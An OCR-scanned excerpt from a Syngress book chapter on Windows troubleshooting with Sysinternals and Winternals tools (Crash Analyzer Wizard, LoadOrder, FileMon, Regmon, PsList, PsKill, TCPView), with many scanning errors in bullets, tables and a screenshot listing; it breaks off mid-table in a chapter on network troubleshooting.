.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
 
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
 
Loading User Symbols 
PEB is paged out (Peb. Ldr = 7ffdf00c). 
Type ".hh dbgerr001" for details 
Loading unloaded module list 
.
.
.
.
.
.
.
.
.
.
 

System Troubleshooting 9 Chapter 7 
305 
* 
Bugcheck Analysis 
w 
Use !analyze -v to get detailed debugging information. 
BugCheck DI, {el13e008, Ic, 0, fa0fb403} 
*** ERROR: Module load completed but symbols could not be loaded for 
myfault, sys 
Probably caused by : myfault.sys 
Followup : MachineOwner 
Bugcheck Analysis 
DRIVER_IRQL_NOT_LESS_OR_EQUAL 
(dl) 
An attempt was made to access a pageable (or completely invalid) address at 
an interrupt request level (IRQL) that is too high. This is usually caused 
by drivers using improper addresses. 
If kernel debugger is available get stack backtrace. 
Arguments: 
Argl: el13e008, memory referenced 
www.syngress.com 

306 
Chapter 7 9 System Troubleshooting 
Arg2: 0000001c, 
IRQL 
Arg3: 00000000, value 0 = read operation, 
1 = write operation 
Arg4: fa0fb403, 
address which referenced memory 
After you have looked through the various tabs of the Analysis Details screen, 
you can click OK to return to the Analysis Summary screen. Click Next to move 
forward to the Recommendations display, shown in Figure 7.3. The recommenda- 
tions are standard, regardless of which driver was determined to be the cause of the 
crash. 
The Recommendations screen also includes links at the bottom to visit the 
Microsoft Knowledge Base or Google if need be. After you review the recommenda- 
tions and you finish viewing the analysis details, click Finish to shut down the Crash 
Analyzer Wizard. Once the Crash Analyzer Wizard identifies a cause for the system 
crash, the Recommendations screen tells you what you can do to resolve the issue. 
Figure 7.3 The Recommendations Screen 
Taking Corrective Action 
After you run the Crash Analyzer Wizard to identify the cause of the system crash, 
you can follow the wizard's recommendations to fix the problem.You can use one of 
the following methods to resolve the conflict. 

System Troubleshooting 9 Chapter 7 
307 
Install Updated Driver 
The problem may be that the driver in question is out-of-date. Microsoft or the 
vendor that created the driver may have already identified the issue and released an 
updated version that resolves the problem. If an updated driver exists, you can find it 
by doing the following: 
9 
Visit the Microsoft Windows Update site (www.windowsupdate.com) and 
run a scan of your system to determine whether any new drivers are avail- 
able. 
[] 
Visit the site of the vendor of the driver in question and search for a new 
or updated version of the driver.You usually can find files like this under 
Support or Downloads. 
9 
Use Google to search for any alternate sources for a new or updated ver- 
sion of the driver. 
Find a Workaround 
If no new or updated versions of the driver are available, you should check the 
Microsoft Knowledge Base or perform a Google search to determine whether 
someone else already identified the issue. If so, you may find information about how 
to mitigate or work around the issue and prevent the system from crashing. 
You should be as specific as possible when entering your search terms to make 
sure you narrow down the results to those that are most relevant to the system crash 
and are the most helpful for resolving the issue. Including the exact error code or 
other information specific to the crash is helpful. 
Disable the Driver 
If all else fails, you can simply remove or disable the offending driver. Open the 
Device Manager and locate the device associated with the errant driver.You can 
right-click on the device and select Disable, or you can select Properties. 
From within the Properties screen, click on the Driver tab. The Driver tab has 
four options to choose from, including Driver Details, Update Driver, Roll Back 
Driver, and Uninstall. If the system crash began after a recent update, you can try 
using the Roll Back Driver option to return to the previous version and see 
whether that resolves the issue. Otherwise, you can use the Uninstall button to 
remove the driver entirely. 

308 
Chapter 7 9 System Troubleshooting 
Real-World Example 
The BSOD system crash used to be a common enough occurrence that I didn't 
bother trying to figure out why a random crash occurred. But, if the system crash 
was happening repeatedly, or occurring enough that it got in the way of using the 
system productively, I had to investigate further. I was experiencing repeated system 
crashes and could not figure out why. Once my computer rebooted after a BSOD 
system crash, I started up the Crash Analyzer Wizard to figure out what the problem 
was. I left the box checked on the Welcome screen to allow the Crash Analyzer 
Wizard to use the default locations for finding the Microsoft Debugging Tools, 
downloading the symbols file from the Microsoft Symbol Server, and automatically 
running the analysis on the most recent crash dump file. 
I watched as a few messages zipped by quickly, letting me know what the Crash 
Analyzer Wizard was doing at that moment. In a few seconds, the analysis was done 
and the Crash Analyzer Wizard had an answer for me. The culprit causing all of the 
problems was the wmdaud.drv driver, one of the drivers associated with the audio 
card in my computer. 
Once I acquired a new version of the driver from the audio card vendor's Web 
site, I updated the driver on my computer, right-clicked on My Computer and 
selected Properties, and then selected the Hardware tab and clicked on the 
Device Manager button. Once I located the correct device, I right-clicked it and 
selected Update Driver to apply the new version. 
With the help of the Crash Analyzer Wizard, I was easily able to identify the 
driver that was causing my system to have chronic BSOD issues, and I resolved the 
problem. 
Identifying Errant Drivers (LoadOrder) 
Another great tool from Winternals is LoadOrder. The Crash Analyzer Wizard is 
very good at analyzing crash dump files and sifting through the available information 
to determine the root cause of a system crash. However, sometimes the Crash 
Analyzer Wizard comes up empty-handed. For those instances, and for other trou- 
bleshooting issues, you can use the flee utility, LoadOrder. 
Running the Utility and Interpreting the Data 
The LoadOrder utility could not be much smaller or simpler than it is. The ZIP file, 
which you can download from Sysinternals (www.sysinternals.com/ 
Utilities/LoadOrder.html), is only 16 KB and contains only two files: the 

System Troubleshooting 9 Chapter 7 
309 
loadord.exe executable file and an EULA text file. Extract the files from the ZIP file 
to a location on your hard drive and you are ready to go. 
Execute LoadOrder 
You can run LoadOrder in two ways, but both will yield the same results.You can 
open a command prompt window, navigate to the directory where you extracted the 
files, and type loadord and press Enter. Alternatively, you can navigate to the direc- 
tory where you extracted the files using the Windows Explorer graphical user inter- 
face (GUI) and double-click on the loadord.exe file. Either way, you will get results 
that look like what you see in Figure 7.4. 
Figure 7.4 The LoadOrder Utility 
Executing the LoadOrder utility produces a GUI display of the drivers and ser- 
vices on the system, listed in the order in which they started. LoadOrder is a simple 
and straightforward tool. It doesn't have a lot of options and command-line switches. 
It simply lets you know in what order your drivers and services are loading. The 
LoadOrder GUI displays the list of drivers and services that started on the system. 
Within the display, the results are grouped by their start value, which tells you 
whether the boot process started the driver or service, whether it is set to turn on 
automatically, or whether it is initiated by the system. 

310 
Chapter 7 9 System Troubleshooting 
Interpret LoadOrder Results 
Reviewing the LoadOrder results within the LoadOrder GUI is not the most effi- 
cient way to do things. The tool includes a Copy button, which you can use to copy 
the contents of the LoadOrder results to the clipboard.You can then save the data to 
a text file. 
You can open the text file from within Excel to give yourself significantly more 
flexibility to sort, filter, and search the results. Five fields are associated with each entry 
in LoadOrder: Start Value, Group Name, Tag, Service/Device, and Display Name. 
The Start Value, Group Number, and Tag fields are derived from entries found in 
the Registry at \HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\ 
Control. Device drivers and services are loaded first, according to their start value 
(ServiceGroupOrder).Then they are loaded by group number (GroupOrderNumber) and 
then by any tag numbers of individual devices or services within the group. Devices 
or services that do not have a tag value assigned are automatically loaded after those 
that do have tag values, but not in any particular order. 
By analyzing the LoadOrder output, you can try to determine whether certain 
drivers or services are causing problems by seizing resources required by other 
drivers or services, or are loading before other resources they depend on.You can 
then make any necessary Registry modifications to alter the order in which the 
drivers or services load, and resolve the issue. 
Real-World Example 
I encountered a problem accessing a drive after installing an additional third-party 
drive. Everything else on the system seemed to be functioning fine, but I just could 
not get the drive to work. I ran LoadOrder to try to determine whether a conflict 
was occurring, and the results showed that the third-party driver was loading before 
the driver for the other drive. 

System Troubleshooting 9 Chapter 7 
311 
Because third-party drivers are sometimes not written as well as other drivers, or 
may not "play nice" with system resources, I decided to switch the order to see 
whether that resolved the problem. The LoadOrder results showed me that the two 
devices had the same start value and the same group number. However, the original 
drive had no tag associated with it, and the third-party driver had a tag of 1. 
I opened RegEdit, navigated to \HKEY_LOCAL_MACHINE\SYSTEM\ 
CurrentControlSet\Control, and located the entry for the third-party driver. I 
deleted the tag value from the third-party driver Registry entry and then added a 
tag value of i to the driver for the original drive, to reverse the order the drivers 
would be loaded. 
The net result was that the driver for the original drive was the first thing to 
load from the group, and the third-party driver was not loaded until after all entries 
with tag values from that group loaded. After rebooting the computer, I found that 
both of the drives worked fine. I ran LoadOrder again just to verify that the drivers 
did load in the correct order. 
Detecting Problematic File and 
Registry Accesses (FileMon, Regmon) 
Two other tools available for monitoring the inner workings of your Microsoft 
Windows computer and helping to isolate issues and conflicts are FileMon and 
Regmon. As their names somewhat imply, you use FileMon to monitor and analyze 
file access and you use Regmon to monitor and analyze Registry access. Let's look 
at how these tools work and how to interpret their output. 
Problematic File Accesses 
Whether some form of malware has compromised your system, or you are just run- 
ning into issues with a faulty file, the FileMon utility is an invaluable tool to help 
you identify the problem. FileMon displays all file system activity on your system in 
real time, as it happens. FileMon tracks and displays every file open, read, write, and 
delete on the FileMon screen, along with the process it is associated with and the 
results of the file activity. 
Installing FileMon 
FileMon is a simple utility that does not require installation.You simply download 
the ZIP file from Sysinternals (www.sysinternals.com/Utilities/FileMon.html) and 
extract the files to a location on your hard drive.You can run FileMon by navigating 

312 
Chapter 7 9 System Troubleshooting 
to the directory from a command prompt, typing filemon, and pressing Enter, or 
you can double-click filemon.exe from within a Windows Explorer display. 
Configuring FileMon 
When you first launch FileMon, it will capture all file activity from local hard drives 
by default.You can use the menu options and toolbar buttons across the top to cus- 
tomize the FileMon configuration to suit your needs.You can empty the display 
window for a flesh start, change the volumes that are being monitored, filter the 
output to view specific files, processes, or actions, and more. 
Selecting Volumes 
Aside from being able to monitor the file activity on local hard drives, you can also 
monitor named pipes, mail slots, and network file activity (see Figure 7.5).You can 
add volumes to monitor, remove local hard drives, or select any combination you 
choose to monitor the activity you need to see. 

System Troubleshooting 9 Chapter 7 
313 
Figure 7.5 The FileMon Display Window 
The FileMon display window has options across the top, one of which allows 
you to select which volumes to monitor. Choosing to monitor file activity on the 
local drives is self-explanatory. The other options may need a little more explanation. 
Here is a description of the different options under Volumes: 
9 
Named Pipes Servers may communicate with clients via named pipes. 
You use named pipes for core subsystem communications such as Local 
Security Authority Subsystem (LSASS) and Distributed Component Object 
Model (DCOM) communications, or for the network Browser service. 
9 
Mail Slots Applications can communicate with each other, locally or 
remotely, by sending messages via mail slots. 
9 
Network This monitors file access to remote network resources such as 
shared drives or universal naming convention (UNC) pathnames. 
Reviewing FileMon Results 
The output displayed in FileMon has seven columns of information. Table 7.1 pro- 
vides a description of the information contained in each column. 

314 
Chapter 7 ~ System Troubleshooting 
Table 7.1 Description of FileMon Data Output 
Display Column 
# 
Time 
Process 
Request 
Path 
Result 
Other 
Description 
A unique identifier assigned to each event in FileMon. 
Each entry will be numbered sequentially, starting at 1. 
Time can be the actual time of day that the event took 
place, or a stopwatch view of how long the event took. 
You can change how time is displayed in the Options. 
Displays the name and ID of the process that is making 
the file request. 
Describes the type of request to which the entry relates. 
Common request types are Open, Write, Read, Close, 
and Delete. 
Shows the directory path to the file or resource being 
accessed. 
Describes the result of the file activity. Common result 
types are Success, No More Files, File Not Found, and 
Path Not Found. 
Used to display additional information or diagnostic 
data related to the file request. 
i 
Filtering FileMon Data 
FileMon provides a number of methods to help you filter and sort results to find the 
information you are looking for.You can disable the AutoscrolUng option if you 
want to freeze the results display without stopping the monitoring.You can also save 
the FileMon results to a tab-delimited text file that you can open in Excel or any 
similar program and sort the data as needed. 
FileMon also provides you the ability to filter the results shown in the FileMon 
display. The FileMon Filter lets you choose to include or exclude specific processes 
or paths from the results display (see Figure 7.6). 

System Troubleshooting 9 Chapter 7 
315 
You can click on Edit followed by Include Process, Exclude Process, 
Include Path, or Exclude Path to specify certain processes or paths to view or 
remove from the view.You can also accomplish the same filtering by clicking on the 
funnel icon at the top of the FileMon display. 
You can learn more about configuring FileMon, and learn how to understand 
and interpret the resulting FileMon data, in Chapter 4. 
Figure 7.6 The FileMon Filter 
Real-World Example 
I installed a new game on my computer but I could not get the game to start. Each 
time I clicked on the icon to launch the program, my computer would start 
grinding away and the game's splash screen logo would display. Then the program 
would simply disappear and nothing would happen. 
I downloaded FileMon from the Sysinternals Web site and fired it up. I started 
the game again and then filtered my FileMon results to show me only the file 
activity associated with the game executable. The last file activity before the game 
crashed was an attempt to access the driver for the sound card. 
I visited the sound card vendor's Web site and found an updated version of the 
driver. Once I updated the sound card driver to the new version, I had solved the 
problem and the game worked fine. 

316 
Chapter 7 9 System Troubleshooting 
Problematic Registry Accesses 
You can identify some issues by monitoring file access, but not all of them. For some 
problems, you may need to monitor activity in the Windows Registry rather than 
the file activity. Sysinternals offers another tool that is very similar in look and func- 
tion to FileMon but is designed to monitor and log all activity in the Registry. The 
program is Regmon and you can download it from 
www.sysinternals, com/Utilities/Regmon.html. 
Installing Regmon 
Like most of the utilities from Sysinternals, Regmon does not require installation to 
run.You simply unzip the file downloaded from Sysinternals to a directory on your 
hard drive and you are ready to go.You can launch the regmon.exe file from a 
Windows Explorer GUI or from a command line. 
Using Regmon 
The Regmon display looks almost identical to the FileMon output, except that the 
path points to a Registry key rather than a file location. Both windows display the 
same seven columns of information. The most noticeable difference in the output is 
that path in FileMon refers to a path to the file being accessed, whereas path in 
Regmon points to the Registry path in which you can find the key (see Figure 7.7). 
Figure 7.7 The Regmon Display 

System Troubleshooting 9 Chapter 7 
317 
Filtering Regmon Results 
As you open programs, surf the Web, and put your computer to work, hundreds and 
even thousands of entries and modifications are being made to the system Registry. 
Regmon is a powerful tool for isolating issues and troubleshooting problems, but the 
sheer volume of results generated by even a couple of minutes of Registry moni- 
toring can be overwhelming. 
Thankfully, Regmon comes with a very robust filtering capability. By clicking 
Edit on the toolbar or clicking on the funnel icon at the top of the 1Kegmon dis- 
play, you can specify exactly what results to show and what to exclude.You can also 
combine filters to narrow down the results, even within a chosen Registry hive. 
For example, if you want to view only the results from HKey Current User 
(HKCU), but you know that you don't need to see the information from Software 
under HKCU, you can add HKCU to the Include filter and HKCU\Software to 
the Exclude filter.You can also use the Highlight filter to make it easier to find the 
results you want. Entries containing the keyword(s) specified in the Highlight filter 
will be highlighted so that you can easily pick them out of the 1Kegmon display (see 
Figure 7.8). 
Figure 7.8 Regmon Results Being Displayed with clsid Entered into the 
Highlight Filter* 
* This method makes it much easier to quickly identify 1Kegmon entries related 
to CLSID. 

318 
Chapter 7 9 System Troubleshooting 
Editing the Registry with Regmon 
Another great Regmon feature is the capability to quickly make any necessary mod- 
ifications to the Registry once a problem has been identified. Regmon allows you to 
automatically open RegEdit and jump instantly to the Registry key you want, by 
simply double-clicking on the relevant entry in the Regmon display.You can also 
click on the RegEdit Jump button above the Regmon display, or press Ctrl+J to 
jump to the specified key in the Registry using RegEdit. 
Real-World Example 
After having performed one too many experiments on my computer in the name of 
furthering my knowledge of how the system worked, I found that my CD drive no 
longer appeared. I tried reinstalling the software and drivers. I visited the vendor 
Web site and downloaded updated drivers, but the drive had disappeared. 
Thinking that maybe Windows could use its magic to undo the damage I had 
done, I manually uninstalled the drive in the Device Manager and waited for 
Windows to detect the device and automatically restore it with plug-and-play; no 
such luck. 
I launched 1Kegmon and then went back through, trying to reinstall the CD 
drive and its associated software and drivers, hoping to find out what was going on. 
Fortunately, I found an entry related to the CD drive in Regmon that had a result of 
Not Found for the Registry entry it was trying to access. 
With a little bit of research and some help from the CD manufacturer support 
team, I was able to figure out what information was supposed to be there and restore 
the Registry keys so that the CD drive could function once again. 
www.syngress.com 

System Troubleshooting 9 Chapter 7 
319 
Analyzing Running Processes (PsTools) 
We have looked at using tools to view file activity and Registry activity. In this sec- 
tion, we will talk about using some of the Sysinternals utilities that let you monitor 
and control processes on local or remote computer systems. 
PsTools is a collection of utilities that you can use to perform a variety of 
administrative and troubleshooting functions on Windows systems.You can down- 
load the PsTools collection from www.sysinternals.com/Utilities/PsTools.html.You 
do not need to install the tools. Just extract or save them to a path on your local 
computer and execute them from a command prompt window. 
Methodologies 
The tools included in the PsTools collection perform a diverse range of functions. 
Among other things, you can list, suspend, stop, and execute processes on either local 
or remote computer systems using the tools in the PsTools suite. 
By understanding how these utilities work, you can apply them to help trou- 
bleshoot and resolve problems. Malware, such as viruses and worms, often runs pro- 
cesses designed to stay hidden and stay running. Using PsTools you can identify and 
stop suspicious or troublesome processes. 
Listing Process Information 
PsList displays CPU-oriented information related to all of the processes currently 
running on the target system.You also can obtain the information that PsList shows 
by using the pmon and pstat utilities from the Windows Resource Kit. PsList is 
more powerful, though, because it combines both of those tools and allows you to 
get process information from remote systems. 

320 
Chapter 7 9 System Troubleshooting 
Customizing PsList Results 
You can modify or customize PsList output using a variety of command-line 
switches. Table 7.2 explains each command-line parameter available in PsList. 
Table 7.2 Command-Line Options for Use with PsList 
Option 
-n 
-d 
-m 
-X 
-t 
-s In] 
-r [n] 
Name 
-U 
-p 
\\computer 
Pid 
Function 
Displays a list of the command-line options and output 
values. 
Shows statistics for all active threads on the system, 
grouped by their owning process. 
Changes output to memory-oriented details rather than the 
default CPU-oriented details. 
Displays the CPU, memory, and thread information for the 
processes specified. 
Displays the tree of processes. 
Causes PsList to update automatically in real time, instead 
of producing a static display. You can also specify how 
many seconds PsList should run in this state. 
Task Manager refresh rate in seconds. 
Allows you to filter PsList results to display only the results 
related to processes that begin with the specified name. 
Specifies a usernarne to use to gain the necessary privileges 
to run on a remote system. 
Specifies the password when including a username for 
accessing remote systems. If a password parameter is not 
included, PsList will prompt for the password when exe- 
cuted. 
Specifies a computer system other than the local computer 
from which to gather process data. 
Displays only the results related to the specified process ID 
(PID) instead of showing all process data. 
Understanding PsList Output 
When you open a command prompt and execute PsList without any additional 
command-line options, you will get output that looks something like this: 
www.syngress.com 

System Troubleshooting 9 Chapter 7 
321 
C: \pstools>pslist 
PsList 1.26 - Process Information Lister 
Copyright 
(C) 1999-204 Mark Russinovich 
Sysinternals 
- www.systinternals.com 
Process information for WINTERNALS: 
Name 
Pid 
Pri 
Thd 
Hnd 
Priv 
CPU Time 
Elapsed Time 
Idle 
0 
0 
1 
0 
0 
22:02:40:685 
0:00:00.000 
System 
4 
8 
55 
244 
0 
0:05:09.695 
0:00:00.000 
smss 
324 
II 
3 
21 
164 
0:00:01.161 
129:00:46.265 
PsList provides the process name, PID, priority, thread, handle, privilege, CPU 
time, and usr, or elapsed time, for each process.You can play around with the various 
command-line options to customize the results for your needs. 
Stopping a Process 
One of the most popular tools in the PsTools collection is PsKill. PsKill comes in 
very handy for dealing with stubborn or poorly written programs, or for eradicating 
malware from your system. Simply put, you use PsKill to kill, or instantly stop, a run- 
ning process. 
Configuring PsKill 
PsKill is a very simple utility with very few options. However, with the few com- 
mand-line options it does have available (see Table 7.3), you can modify the way 
PsKill runs. 

322 
Chapter 7 9 System Troubleshooting 
Table 7.3 Command-Line Options for Use with PsKill 
Option 
Function 
-t 
-U 
-p 
Kills the identified process, as well as all of its descendant 
processes. 
Specifies a username to use to gain the necessary privileges 
to run on a remote system. 
Specifies the password when including a username for 
accessing remote systems. If a password parameter is not 
included, PsList will prompt for the password when exe- 
cuted. 
Using PsKill 
In order to end a process using PsKill, you need to know the process name or PID. 
You should start by using PsList or some other tool to identify the processes running 
on the system and single out the problem process that you wish to terminate. 
Open a command prompt window and switch to the directory where the 
pskill.exe file is located. Simply enter pskill, followed by the name or PID of the 
process you want to terminate, and press Enter. PsKill will execute and display a 
short message confirming that the process has ended. 
Putting It All Together 
(FileMon, RegMon, PsTools) 
FileMon, RegMon and the programs in PsTools are all powerful utilities on their 
own. Occasionally though, troubleshooting and identifying a problem may require 
using one or more of these tools together to put the pieces of the puzzle together. 

System Troubleshooting 9 Chapter 7 
323 
Finding Suspicious F les 
If you notice that your computer is acting weird, but your antivirus and anti-spwyare 
scans come up clean, you may need to do some deeper forensic digging to find the 
problem. 
To begin with, you can launch FileMon to have a look at the file activity on the 
computer. If you don't know what you are looking for, you will need to analyze 
the FileMon output and try to identify files or file activity that seems bizarre or 
suspicious. 
You can pay particular attention to unknown programs that invoke or launch 
other programs or DLL files. Be aware that many malware programs, at least the 
better written ones, will use file names that are designed to mimic system files. They 
frequently use names that are variations on 'explorer' or 'system'to camouflage them- 
selves with the legitimate system files. 
If you find files that seem exhibit weird behavior or have suspicious file activity, 
you can try a Google search for the file name to see if there are any known conflicts 
or issues with the file that might help you resolve the problem. 
Digging Deeper with RegMon 
If you identify questionable files with FileMon but can't locate any further informa- 
tion on Google, or your FileMon investigation comes up empty, the next stop is 
RegMon. Launch RegMon and take a look at the registry activity output to help 
you further narrow down the problem. 
If you have identified file activity in FileMon that you want to learn more 
about, you can filter the RegMon results to display only the registry activity associ- 
ated with the file or files you have identified. RegMon does not filter by file name 
though.You can identify the associated Process from the FileMon output and filter 
the RegMon data for the same Process to narrow down the results. 

324 
Chapter 7 9 System Troubleshooting 
Within those results, you can look for odd registry behavior or activity. Pay spe- 
cial attention to activity where the Result is Not Found. If you did not identify any 
files using FileMon, you can still recreate the scenario where you experience the 
problem and analyze the registry activity during that time to search for odd registry 
entries or behavior. 
Wrapping It Up with PsTools 
After you investigate bizarre system activity using FileMon and RegMon, you need 
to take action to resolve the issue. If you have identified a particular file or registry 
entry that appears to be the cause of, or at least related to, the issue, you can take 
steps to shut it down. 
You can start by running PsList to enumerate the processes that are currently 
running on the system. Locate the process associated with the file or registry activity 
that you want to terminate and make a not of the pid.You can then use the 
PsSuspend to pause, or PsKill to terminate the process. 
You can also use another Sysinternals program, Process Explorer (www.sysinter- 
nals.com/Utilities/ProcessExplorer.html) to help connect the dots between the pro- 
cesses that are running and the files and ports they are using on the system. 
www.syngress.com 

System Troubleshooting 9 Chapter 7 
325 
Summary 
In this chapter, we covered a broad range of tools and information aimed at helping 
you to troubleshoot and resolve problems with your computer system. 
We discussed using the Crash Analyzer Wizard from the Winternals 
Administrator's Pak to help you isolate the cause of the dreaded Blue Screen of 
Death system crash. Using the results of the Crash Analyzer Wizard, you can find a 
solution or workaround that will restore the system to functionality. 
You learned about the FileMon and Regmon tools from Sysinternals, and how 
to use them to monitor file and Registry activity on your computer. Using these 
two utilities, you can view real-time file and Registry activity and identify or isolate 
problem areas. The ability to filter and sort the data to view only the results perti- 
nent to your troubleshooting efforts is critical. 
You also learned about PsTools, specifically PsList and PsKill, and how to use 
them to identify processes that are causing problems and to terminate the processes if 
need be. 
Last, we talked about bringing the various tools together and applying FileMon, 
Regmon, and the PsTools utilities to identify and resolve conflicts on the local com- 
puter system. 
Solutions Fast Track 
Making Sense of a Windows 
Crash (Crash Analyzer Wizard) 
I-4I Windows saves pertinent information about the state of the computer in a 
crash dump file. 
The Crash Analyzer Wizard sifts through the crash dump data to locate the 
cause of the system crash and identify the driver at fault. 
!-4I The Crash Analyzer Wizard requires that the Microsoft Debugging Tools be 
loaded as well. 
Vr The Advanced tab of the Analysis Details screen provides a complete 
transcript of information generated by the crash dump analysis. 

326 
Chapter 7 9 System Troubleshooting 
Identifying Errant Drivers (LoadOrder) 
Reviewing the order in which drivers and services are started on the 
system can be helpful in determining the root cause of computer issues. 
LoadOrder is a free utility that displays a listing of the drivers and services 
on a system, along with useful information including the order in which 
they started. 
Some driver information may be incorrect because of the way plug-and- 
play drivers are loaded as the devices are detected and added to the system. 
F/I Copying the results to a text file and opening it in an Excel spreadsheet 
makes it easier to sort and filter the results to find what you are looking 
for. 
Adding or modifying Registry entries in the Registry at 
\HKEY_LOCAL_MACHINE\SYSTEM\ CurrentControlSet\ Control can 
alter the order in which drivers or services are started. 
Detecting Problematic File 
and Registry Accesses (FileMon, Regmon) 
You can use FileMon to view all file activity on local volumes, named 
pipes, mail slots, and network resources. 
V-'d You can filter the FileMon results to display only those associated with a 
particular process or path to target your troubleshooting. 
Regmon is a tool that can monitor all Registry activity.You also can use it 
to identify and troubleshoot problems. 
You can quickly jump from Regmon to RegEdit to modify Registry keys 
by double-clicking on the entry in the Regmon display window. 

System Troubleshooting 9 Chapter 7 
Analyzing Running Processes (PsTools) 
EI You can use PsList to display details about the CPU and memory use of 
each running process on the target system. 
You can use many of the tools in PsTools on remote systems, as long as you 
supply the proper credentials. 
You can use PsKill to terminate the process associated with a given PID or 
process name. 
You can use the -t command-line option with PsKill to terminate the 
process specified, and all of its descendants. 
Putting It All Together (FileMon, RegMon, PSTools) 
V~ Using the tools in combination can help to isolate and identify problems 
~I You can use information found in one tool to help you filter or narrow 
down your results in another tool 
Try to recreate the event or scenario where you experience the problem 
while you are using the tools so you can watch what happens in real-time 
Google is useful for looking up files, processes or registry activity that 
seems improper to determine if there are known issues 
327 


System Troubleshooting 9 Chapter 7 
329 
A: Regmon allows you to filter the results very specifically to display only those 
related to what you are looking for.You can also use the Highlight filter to 
highlight any Regrnon entries with the keyword(s) you specify. 
Q- How can I find out what processes are running on a remote computer? 
A: PsList, a utility included in the free PsTools collection, can gather process infor- 
mation details from remote computers as long as you supply a valid username 
and password with the necessary credentials. 
Q" What do I do if a program is hung on my computer and I can't get it to shut 
down properly? 
A" You can use PsList to identify the process name or PID associated with the 
errant program, and then you can use PsKill to terminate the process. 
Q" How can I tell which FileMon or RegMon entry is the one I am looking for? 
A" Assuming that you are using the tools to help identify a specific problem, you 
should recreate the event or scenario where you experience the problem while 
the tools are open so you can view the activity in real-time and determine what 
is happening. 


332 
Chapter 8 9 Network Troubleshooting 
Introduction 
Sometimes the problems a user is facing on his computer are not related to a local 
operating system resource issue, but rather, to network settings. Many tools can help 
an administrator troubleshoot network issues; some even come standard in Windows. 
Unfortunately, a large number of these are too complicated to use, too expensive, or 
just inadequate. Luckily, in the Winternals and Sysinternals toolboxes, we can find a 
number of practical and easy-to-use tools that give the right information in a way 
that is most useful to an administrator. 
In this chapter, you will learn how to monitor active socket connections and see 
which process is doing what on the network.You will also learn how to identify 
applications running locally that are not performing correctly on the network, and 
how to troubleshoot Transmission Control Protocol/Internet Protocol (TCP/IP) 
connections. Finally, you will find out how to get some useful network- and 
Internet-related information using a few simple Sysinternals tools. 
Monitoring Active Network Connections 
(TCPView, Tcpvcon, TCPView Pro) 
Winternals maintains two sets of network tools. Free network tools TCPView, 
TCPVcon, and TDIMon can be found on the Syslnternals.org website. Commercial 
network tools are found on the Winternals.org website. The commercial tools 
(TCPView Pro and TCPVstat) are collectively called TCPTools 
TCPView 
The name of this tool, TCPView, is a misnomer, since it shows TCP/IP and User 
Datagram Protocol/Internet Protocol (UDP/IP) information.According to the 
TCPView Help file, "TCPView provides a conveniently presented subset of the 
Netstat program that ships with Windows NT/2000/XP." Earlier versions of Netstat 
could not display the process name responsible for the connection. Netstat has 
broader functionality than .just endpoint monitoring, and with different parameters it 
can provide network statistics sorted or filtered by protocol, or it can display the 
routing table. Since Netstat is a command-line application, its output can be piped to 
other applications or sent to a file. Netstat can display the sequence of compo- 
nents~executables, dynamic link libraries (DLLs), and so on--involved in estab- 
lishing and listening to a connection. TCPView has a limitation in that it can display 
only the endpoints that were initiated after TCPView was loaded. This means that 
drives mapped during the boot process will not show up. The commercial version of 

Network Troubleshooting 9 Chapter 8 
333 
TCPView (found in TCPTools) loads the driver during the boot process and can 
display all endpoints. 
TCPView is much easier to use than Netstat. It is easier to read and easier to get 
a periodic snapshot of network connections. TCPView permits you to end connec- 
tions in real time, which Netstat cannot do. 
TCPView displays the process name, the process ID (PID), the local address (IP 
address or resolved name) and port, the remote address and port, and the status of 
the connection (see Figure 8.1). 
Figure 8.1 TCPView Column Headings 
iii',ii!i .............. i~iiii~iiiiii~iii~iii!~;:~ii~ii~ii!~ii~i2i~i~i~i~ii~iiiiiii~i~i~i~i!!iiii!ii!iiiiii!i!`'ii!~i~i:iiiiit~ 
......................................... 
.............................................................. 
`~:::Zii;ii;i;~;!;~;i;i;~;~zi;::~i;i;~i;~;~;i~i;ii;~;~zi~!;!;~;ii;i~;ii 
[] =vcho=t.exe: 1352 
UDP 
po12963[:'hawkeye 
. cor~ast . com:1900" 
N~ Ir 
~] S.~'ter~ 4 
UDP 
poI2563, hawkeye, comcast, corn:, netbios-dgrn 
"" 
~ S.v~ern:4 
UDP 
pot2963, hawkeye, comcest, corn: netbios-ns 
"" 
S~tem:4 
TCP 
por2963.hewkeye.comcast.corn:netbio$-:m 
POL2963:0 
[] =vchost.exe:1200 
UDP 
po12963, hawkeye, comca=t, corn:nip 
"" 
~t=~,,l elg.exe:1456 
TCP 
POL2963:1025 
POL2963:0 
~chost exe:1244 
UDP 
POL2563:1026 
[] I~,a.exe:924 
UDP 
POL2963:1027 
"'= 
~] winiogon.exe:.868 
UDP 
POLLXJ63:1073 
*'" 
[] ~d'~t.exe:1244 
UDP 
P01.2963:1560 
"'* 
[] svchost.exe:1352 
UDP 
POL2963:1900 
"" 
[] I$~=.exe:924 
UDP 
POL2963:4500 
"'" 
[] ~,vchoct exe:1164 
TCP 
POL2963:epmap 
POL2963:.0 
[] I=~=.ex'e:92.4 
UDP 
POL2963:i,~kmp 
"'" 
~...1S~em:4 
TCP 
POL2~mi~'osoft-ds 
POL2563:0 
[] ~,~.e~e:1200 
UDP 
POLLXJ63:.ntp 
":" 
LISTENING 
LISTENING 
LISTENING 
LISTENING 
Analysts can use Process Explorer to learn more about the process with the net- 
work connection, using either the process name or the PID. The Protocol column is 
limited to TCP or UDP. The local address and port can be displayed numerically or 
with the address and service resolved. The display can be sorted in ascending or 
descending order, based on the local address. In the Remote Address column, a fully 
qualified name and port indicate an outbound connection to a remote host. * .* 
indicates an internal communication using network functions. The host name or an 
IP address of 0.0.0.0 indicates that an application is listening on the port identified 
in the Local Address column. 
The State column indicates the TCP connection state.Table 8.1 explains the 
potential states. UDP is connectionless, and thus, UDP has no connection state. 

334 
Chapter 8 9 Network Troubleshooting 
Table 8.1 TCP Connection State Definitions 
State 
Listening 
Syng Set 
Syn Recvd 
Established 
Fin Wait 1 
Fin Wait 2 
Close Wait 
Closing 
Last Ack 
Time Wait 
Closed 
Definition 
Waiting for a connection request from any remote 
TCP and port. 
Waiting for a matching connection request after 
having sent a connection request. 
Waiting for a confirming connection request 
acknowledgment after having both received and 
sent a connection request. 
An open connection; data received can be delivered 
to the user. This is the normal state for the data 
transfer phase of the connection. 
Waiting for a connection termination request from 
